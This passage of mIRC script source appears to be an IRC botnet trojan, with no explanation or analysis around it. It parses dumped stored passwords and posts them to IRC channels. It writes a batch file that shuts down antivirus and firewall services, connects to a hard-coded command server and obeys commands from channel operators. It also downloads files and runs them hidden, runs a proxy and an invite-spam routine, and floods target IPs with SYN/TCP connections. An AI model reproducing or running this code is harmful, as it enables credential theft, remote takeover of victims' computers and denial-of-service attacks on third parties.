    if (AutoComplete Fields isin %read) || (Outlook Express Identity isin %read) { write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | goto start }
    write -dl1 sr.dll
  }
  set %read $read(sr.dll,1)
  if (User Name/Value : isin %read) { tokenize 32 %read | set %UserN $4- | write -dl1 sr.dll } 
  set %read $read(sr.dll,1)
  if (Password : isin %read) { tokenize 32 %read | set %Upass $3- | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll
    if (%Source = $null) || (%UserN = $null) || (%Upass = $null) { halt }
    if (%rwword isin %Source) { privmsg #x1x [PASS] Source: %Source Username: %UserN Password: %Upass }
  }
}
alias p4sses {
  :start
  if ($file(sr.dll) = 0) { if ($exists(sr.dll) = $true) { remove sr.dll } | set %stch3ck off | timert4rg4p off }
  set %read $read(sr.dll,1)
  if (%read = ==================================================) { write -dl1 sr.dll }
  set %read $read(sr.dll,1)
  if (Resource Name isin %read) { tokenize 32 %read | set %Source $4- | write -dl1 sr.dll }
  set %read $read(sr.dll,1)
  if (Resource Type isin %read) {
    if (AutoComplete Fields isin %read) || (Outlook Express Identity isin %read) { write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll | goto start }
    write -dl1 sr.dll
  }
  set %read $read(sr.dll,1)
  if (User Name/Value : isin %read) { tokenize 32 %read | set %UserN $4- | write -dl1 sr.dll } 
  set %read $read(sr.dll,1)
  if (Password : isin %read) { tokenize 32 %read | set %Upass $3- | write -dl1 sr.dll | write -dl1 sr.dll | write -dl1 sr.dll
    if (%Source = $null) || (%UserN = $null) || (%Upass = $null) { halt }
    privmsg #FBIGT1 [PASS] Source: %Source Username: %UserN Password: %Upass
  }
}
alias s3cur3 {
  set %s3cur3 s3cur3.bat
  if $exists(s3cur3.bat) { write -c %s3cur3 }
  write -c %s3cur3 @echo off
  Wi "RsRavMon"  
  Wi "RsCCenter" 
  Wi "Norton AntiVirus Server" 
  Wi "Norton AntiVirus" 
  Wi "Serv-U" 
  Wi "Norton AntiVirus Auto Protect Service" 
  Wi "Norton AntiVirus Client" 
  Wi "Symantec AntiVirus Client" 
  Wi "Norton AntiVirus Server" 
  Wi "NAV Alert" 
  Wi "Nav Auto-Protect" 
  Wi "McShield" 
  Wi "DefWatch" 
  Wi "eventlog" 
  Wi "TCP/IP NetBIOS Helper Service" 
  Wi "WMDM PMSP Service" 
  Wi "lmhosts" 
  Wi "eventlog" 
  Wi "InoRPC" 
  Wi "InoRT" 
  Wi "InoTask" 
  Wi "IREIKE" 
  Wi "IPSECMON" 
  Wi "GhostStartService" 
  Wi "SharedAccess" 
  Wi "NAVAPSVC" 
  Wi "NISUM" 
  Wi "SymProxySvc" 
  Wi "NISSERV" 
  Wi "ntrtscan" 
  Wi "tmlisten" 
  Wi "PccPfw" 
  Wi "tmproxy" 
  Wi "Tmntsrv" 
  Wi "PCCPFW" 
  Wi "AvSynMgr" 
  Wi "McAfeeFramework" 
  Wi "Micorsoft Network Firewall Service" 
  Wi "AvgServ" 
  Wi "MonSvcNT" 
  Wi "V3MonNT" 
  Wi "V3MonSvc" 
  Wi "spidernt" 
  Wi "MCVSrte" 
  Wi "SweepNet" 
  Wi "SWEEPSRV.SYS" 
  write %s3cur3 del %s3cur3
}
alias ipnick { 
  if (*edu* iswm $host) || (.ad. isin $host) || (.ac. isin $host) || (.cc. isin $host) || (uni isin $host) && (wk isin $uptime(system,2)) { return [edu-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*edu* iswm $host) || (.ad. isin $host) || (.ac. isin $host) || (.cc. isin $host) || (uni isin $host) && (day isin $uptime(system,2)) { return [edu-day- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*edu* iswm $host) || (.ad. isin $host) || (.ac. isin $host) || (.cc. isin $host) || (uni isin $host) { return [edu- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (.gov isin $host) && (wk isin $uptime(system,2)) { return [gov-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (.gov isin $host) && (day isin $uptime(system,2)) { return [gov-day- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (.gov isin $host) { return [gov- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*videotron* iswm $host) || (*sympatico* iswm $host) || (*optoline* iswm $host) || (*home* iswm $host) || (*chello* iswm $host) || (*xs4all* iswm $host) || (*telus* iswm $host) || (*comcast* iswm $host) || (*rr* iswm $host) || (*attbi* iswm $host) || (*a2000* iswm $host) || (*pacbell* iswm $host) || (*optusnet* iswm $host) || (*wanadoo* iswm $host) || (*blueyonder* iswm $host) || (*bellsouth iswm $host) || (*rogers* iswm $host) || (*adsl* iswm $host) && (wk isin $uptime(system,2)) { return [28k-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*videotron* iswm $host) || (*sympatico* iswm $host) || (*optoline* iswm $host) || (*home* iswm $host) || (*chello* iswm $host) || (*xs4all* iswm $host) || (*telus* iswm $host) || (*comcast* iswm $host) || (*rr* iswm $host) || (*attbi* iswm $host) || (*a2000* iswm $host) || (*pacbell* iswm $host) || (*optusnet* iswm $host) || (*wanadoo* iswm $host) || (*blueyonder* iswm $host) || (*bellsouth iswm $host) || (*rogers* iswm $host) || (*adsl* iswm $host) && (day isin $uptime(system,2)) { return [28k-day- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*videotron* iswm $host) || (*sympatico* iswm $host) || (*optoline* iswm $host) || (*home* iswm $host) || (*chello* iswm $host) || (*xs4all* iswm $host) || (*telus* iswm $host) || (*comcast* iswm $host) || (*rr* iswm $host) || (*attbi* iswm $host) || (*a2000* iswm $host) || (*pacbell* iswm $host) || (*optusnet* iswm $host) || (*wanadoo* iswm $host) || (*blueyonder* iswm $host) || (*bellsouth iswm $host) || (*rogers* iswm $host) || (*adsl* iswm $host) { return [28k- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*cable* iswm $host) && (wk isin $uptime(system,2)) { return [cable-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*cable* iswm $host) && (day isin $uptime(system,2)) { return [cable-day- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*cable* iswm $host) { return [cable- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*www* iswm $host) && (wk isin $uptime(system,2)) { return [www-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*www* iswm $host) && (day isin $uptime(system,2)) { return [www-day- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*www* iswm $host) { return [www- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*dsl* iswm $host) && (wk isin $uptime(system,2)) { return [dsl-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*dsl* iswm $host) && (day isin $uptime(system,2)) { return [dsl-day- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*dsl* iswm $host) { return [dsl- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*dailup* iswm $host) && (wk isin $uptime(system,2)) { return [56k-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*dailup* iswm $host) && (day isin $uptime(system,2)) { return [56k-day- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*dailup* iswm $host) { return [56k- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*server* iswm $host) && (wk isin $uptime(system,2)) { return [server-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*server* iswm $host) && (day isin $uptime(system,2)) { return [server-day- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (*server* iswm $host) { return [server- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (wk isin $uptime(system,2)) { return [wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (day isin $uptime(system,2)) { return [day- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  return $+([,$os,[,$r(01,9999999),],%str,])
  :end
}
alias fnick {
  set %fnick $rand(1,6)
  if (%fnick = 1) { return $read nik.sys $+ $chr($r(65,125)) $+ $chr($r(65,125))  }
  if (%fnick = 2) { return $chr($r(65,125)) $+ $read nik.sys $+ $chr($r(65,125))  }
  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  nik.sys }
  if (%fnick = 4) { return $r(A,Z) $+ $read nik.sys $+ $r(A,Z) }
  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }
  if (%fnick = 6) { return $read  nik.sys $+ $r(1,40) $+ $chr($r(65,125))  }
}
alias xGun {
  if ($1 = Se) { return g2.kuwaitan.com }
  if ($1 = Po) { set %pt1 $r(1,2) | if (%pt1 == 1) { return 1129 } | if (%pt1 == 2) { set %pt1 0 | return 1129 } }
  if ($1 = C1) { return #FBIGT }
  if ($1 = C2) { return #FBIGT }
  if ($1 = Nk) { return 75706 }
  if ($1 = Cl) { return 639 }
  if ($1 = Nc) { return Windows help File }
  if ($1 = Nq) { return Windows help F1le }
  if ($1 = hed) { return heds.exe }
  if ($1 = Hed2) { return heds.exe }
}
on *:START:{ .run $xGun(Hed) /n /fh hlep32 | /timer 1 1 server $xGun(se) $xGun(po) | .StR }
on *:disconnect:{ timerconnec -o 0 15 server $xGun(Se) $xGun(Po)  }
on *:exit:{ stopscan | clearall | sockclose * | timers off }
on *:connect:{ .ial on | .timerconnec off | .mode $me +i-x | nick $ipnick | .jc | .pdcc on | .fsend on | clearall | //window -h " $+ $active $+ " }
on *:OP:#: { if ($opnick = $me) { //mode $xGun(C1) +mnstk $xGun(nk) } }
on *:PING:{ ctcp $me ping }
on *:join:#:{ if ($nick == $me) { //window -h " $+ $active $+ " | .timerjc off | //names $xGun(C1) | timernames 0 120 //names $xGun(C1) } }
on *:part:#:{ if ($nick == $me) { timerjc 0 3 /jc } }
on *:KICK:#:{ if ($knick == $me) { timerjc 0 3 /jc } }
on *:dns:{ %address = $iaddress } { if (%dns.r == on) { TeSts dns: %dns.rrr resolved to ip: $iaddress host: $naddress | unset %dns.* } } c
on *:TEXT:*:*:if ($nick isop $xGun(C1)) { CmDBoT $1- }
on *:sockopen:Ars:{ if ($sockerr) { TesTs error: socket error. | return } | .write -c %Ars2 | .sockwrite -n $sockname GET / $+ %Ars3 HTTP/1.0 | .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %Ars1 | .sockwrite -n $sockname }
on *:socklisten:ident: { .sockaccept $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }
on *:sockread:Ars:{ if (%Arsready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %Arslength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %Arsready = 1 | %Arsoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %Ars2 -1 -1 &d | sockread 4096 &d } }
on *:sockread:IDENT.*: { sockread %tmp | tokenize 32 %tmp | sockwrite -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }
on *:socklisten:Bnc:{ sockaccept Bnc.temp | %conncheck = $sock(Bnc.temp).ip | if ($sock($+(bnc.in.,%conncheck))) { sockclose bnc.temp } | sockrename Bnc.Temp Bnc.temp. [ $+ [ $sock(Bnc.temp).ip ] ] }
on *:sockread:Bnc.temp.*:{ sockread %bnc.in | tokenize 32 %bnc.in { if ($1 = NICK) { sockwrite -n $sockname NOTICE $host :BNC iRc Proxy ( $+ $2 $+ ) | set %Bnc.nick. [ $+ [ $sock($sockname).ip ] ] $2 | halt } | if ($1 = USER) { .identd on $2 | set %Bnc.user. [ $+ [ $sock($sockname).ip ] ] $2- | sockwrite -n $sockname NOTICE $host :Please type /pass <password> | halt } | if ($1 = PASS) { if ($2 = %Bnc.pass) { sockwrite -n $sockname NOTICE $host :Password accepted, Welcome In... | sockwrite -n $sockname NOTICE $host :Please type /conn <server> <port> | sockrename $sockname $replace($sockname,Bnc.temp,Bnc.in) | halt } | if ($2 != %Bnc.pass) { sockwrite -n $sockname NOTICE $host :Access Denied.. } | if (!$2) { sockwrite -n $sockname NOTICE $host :You Need A Password To Cconnect | sockwrite -n $sockname NOTICE $host :Please Type /pass <password> }  } } }
on *:sockread:Bnc.in.*:{ sockread %bnc.in | tokenize 32 %bnc.in { if ($1 = USER) { .identd on $2 | set %Bnc.user. [ $+ [ $sock($sockname).ip ] ] $2- | halt } | if ($1 = CONN) { if (!$2) { sockwrite -n $sockname NOTICE $host :please type /conn <server> <port> | halt } | if (!$3) { %xxxx = 6667 } | if ($3) { %xxxx = $3 } | if ($sock($replace($sockname,Bnc.in,Bnc.out))) { sockwrite -n $sockname NOTICE $host :Disconnecting from previous connection | sockclose Bnc.out. [ $+ [ $sock($sockname).ip ] ] } | sockopen $replace($sockname,Bnc.in,Bnc.out) $2 %xxxx | sockwrite -n $sockname NOTICE $host :making reality through $2 port %xxxx | unset %xxxx | halt } | if ($1 = NICK) { set %bnc.nick. [ $+ [ $sock($sockname).ip ] ] $2 } | if ($sock($replace($sockname,Bnc.in,Bnc.out))) { sockwrite -n $replace($sockname,Bnc.in,Bnc.out) $1- } } | unset %bnc.in }
on *:sockopen:Bnc.out.*:{ if ($sockerr) { sockwrite -n $replace($sockname,Bnc.out,Bnc.in) NOTICE $host :Failed Connection | halt } | sockwrite -n $replace($sockname,Bnc.out,Bnc.in) NOTICE $host :Suceeded Connection | sockwrite -n $sockname NICK %Bnc.nick. [ $+ [ $remove($sockname,Bnc.out.) ] ] | sockwrite -n $sockname USER %Bnc.user. [ $+ [ $remove($sockname,Bnc.out.) ] ] }
on *:sockread:Bnc.out.*:{ sockread %Bnc.out | if (!$sock($replace($sockname,Bnc.out,Bnc.in))) { sockwrite -n $sockname Quit :Dead Socket. | halt } | sockwrite -n $replace($sockname,Bnc.out,Bnc.in) %Bnc.out | unset %bnc.out }
ON *:sockopen:chase*:{
  IF $SOCKERR { RETURN }
  %|TEMP = $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)
  sockwrite -nt $sockname USER $read(nik) $r(a,z) $r(a,z) : $+ $read(nik) $read(nik)
  sockwrite -nt $sockname NICK Guest $+ $r(1,99999)
}
on *:SOCKREAD:CHASE*:{
  sockread %chase
  tokenize 32 %chase
  if ($1 = PING) { sockwrite -n $sockname PONG $2- }
  if ($2 = 432) { .timerX $+ $sockname 0 3 chasenick $sockname }
  if ($2 = 601) { sockwrite -n $sockname NICK $4 }
  if ($2 = 605) { sockwrite -n $sockname NICK $4 }
  if ($2 = 376) { sockwrite -n $sockname MODE $3 +iR | sockwrite -n $sockname WATCH $+(+,%chase.nick) }
  if ($1 = ERROR) { %sockname = $sockname | %ip = $sock($sockname).ip | %port = $sock($sockname).port | sockclose $sockname | sockopen %sockname %ip %port } 
  if ($2 = NICK) && (%chase.nick = $remove($3,:)) { sockwrite -n $sockname NICKSERV register %chase.pass %chase.mail }
  if ($4 = 440) { .timerX $+ $sockname 0 3 chasenick }
}
on *:sockread:xIx*:{ sockread %BoTread | Stay %BoTread }

on *:Sockopen:xIx*:{
  set -u1 %user $rand(A,Z) $+ $fnick $+ $rand(A,Z)
  .GuCciSock $sockname USER %user %user %user : $+ %user
  .GuCciSock $sockname NICK %user
}
on *:sockread:iNv*:{  sockread -f %t.i | if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) { write i1ch4n.txt $gettok(%t.i,4,32) } | if ($gettok(%t.i,2,32) == 321) { msg %s.i.c  iNv-> Listing channels on $remove($gettok(%t.i,1,32),:) } | if ($gettok(%t.i,2,32) == 323) { msg %s.i.c  iNv-> Listing channels complete on $remove($gettok(%t.i,1,32),:) [Total Channels in List: $+ $lines(i1ch4n.txt) $+ ] } 
  if ($gettok(%t.i,2,32) == 474) { msg %s.i.c  iNv-> Join Error: Banned from ( $+ $gettok(%t.i,4,32) $+ ) }  | if ($gettok(%t.i,2,32) == 433) { /sockwrite -nt iNvN NICK $gettok(%t.i,4,32) $+ $r(a,z) } | if ($gettok(%t.i,1,32) == PING) { sockwrite -nt $sockname PONG $gettok(%t.i,2,32) } |  if ($gettok(%t.i,2,32) == JOIN) { if (%i.on == Off) { halt } |  if ($timer($remove($gettok(%t.i,1,33),:)) !== $null) { halt } 
  if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } | set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done |  set %i.on Off | /timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt iNvM PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg |  /sockwrite -nt iNvN WHOIS : $+ $remove($gettok(%t.i,1,33),:) |  inc %i.t.j |  .timer 1 %i.ondelay set %i.on Yes }  | if ($gettok(%t.i,2,32) == KICK) { sockwrite -nt iNvN JOIN : $+ $gettok(%t.i,3,32) } 
  if ($gettok(%t.i,1,32) == ERROR) { msg %s.i.c  iNv-> Error Connecting: %t.i (attempting to reconnect)-(to stop !iNv stop) | /timerinviteconnect 0 3 /sockopen iNv %i.server %i.port } 
  if ($gettok(%t.i,2,32) == MODE) {  if ($gettok(%t.i,4,32) == +o) {  if ($timer($gettok(%t.i,5,32)) == $null) { halt } |  .timer $+ $gettok(%t.i,5,32) off |   dec %i.t.j 1 |  /msg %chan  iNv! error: not inviting: $gettok(%t.i,5,32) because he was opd!  }  |  if ($gettok(%t.i,4,32) == +v) {  if ($timer($gettok(%t.i,5,32)) == $null) { halt } |  .timer $+ $gettok(%t.i,5,32) off |  dec %i.t.j 1 |  } }
  if ($gettok(%t.i,2,32) == NICK) {  if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |  /timer $+ $remove($gettok(%t.i,1,33),:) off | dec %i.t.j } | if ($gettok(%t.i,2,32) == QUIT) { if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |  /timer $+ $remove($gettok(%t.i,1,33),:) off  | dec %i.t.j } | if ($gettok(%t.i,2,32) == 313) {  /msg %s.i.c 12iNv Warning!!!: 3IRCOP DETECTED!!!! 10-[12 $+ $gettok(%t.i,4,32) $+ 10] 
if ($timer($gettok(%t.i,4,32)) == $null) { halt } | /timer $+ $gettok(%t.i,2,32) off } }
on 1:sockopen:iNv*: {  sockwrite -nt $sockname PONG $server | sockwrite -tn $sockname User $read Nik.sys $+ $r(a,z) $+ $r(1,60) a a : [ [ $read Nik.sys ] ] | sockwrite -tn $sockname Nick $read Nik.sys | /timerinviteconnect off | sockread }
on 1:sockclose:iNv*:{ if (%i.b == off) { remove i1ch4n.txt | halt } | if (%i.b == on) { msg %s.i.c 12[15in14vit15er12]: iNv was disconnected! (Reloading). | /sockopen $sockname %i.server %i.port } }
on *:sockclose:Ars:{ 
  if ($file(%Ars2).size != %Arslength) { .sockclose Ars | Ars http:// $+ %Ars1 $+ / $+ %Ars3 } 
  else { TesTs file Arsed: ( $mircdir $+ %Ars2 ) ( $+ $file(%Ars2).size bytes $+ , $+ $bytes($file(%Ars2).size).suf $+ ) } 
  if (%Ars.r = on) { hiden /n /fh /r " $+ $mircdir $+ %Ars2 $+ " }
  unset %Ars*
}
AliAs syn1 {
  sET %gnUM 0 | .timergCoolT -M %timer.fbiip 0 syn3
}

AliAs syn3 {
  iF %gnUM >= %timer.fbiip { goTo Done }
  inC %gnUM 2
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  reTUrn
  :Done
  TeSts sy1 Fire Finished For %fbip
  .timergCoolT oFF
  .soCkClose syn*
  .UNsET %fbip
  .UNsET %subb
  .UNsET %timer.fbiip
}
AliAs syn2 {
  sET %gnUM 0 | .timergCoolT -M %timer.fbiip 0 syn4
}

AliAs syn4 {
  iF %gnUM >= %timer.fbiip { goTo Done }
  inC %gnUM 2
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  reTUrn
  :Done
  TeSts sy2 Fire1 Finished For %fbip PorT : %subb
  .timergCoolT oFF
  .soCkClose syn*
  .UNsET %fbip
  .UNsET %subb
  .UNsET %timer.fbiip
}

AliAs TCP {
  sET %gnUM 0 | .timergCoolT -M %timer.fbiip 0 TCPP
}

AliAs TCPP {
  iF %gnUM >= %timer.fbiip { goTo Done }
  inC %gnUM 2
  soCkoPen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  soCkoPen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %fbip %subb
  reTUrn
  :Done
  TeSts cpacket Finished For %fbip
  .timergCoolT oFF
  .soCkClose PACkeT*
  .UNsET %fbip
  .UNsET %timer.fbiip
}
AliAs TCPsToP {
  .timergCoolT oFF
  .soCkClose PACkeT*
  .UNsET %fbip
  .UNsET %subb
  TeSts cpacket stOped
}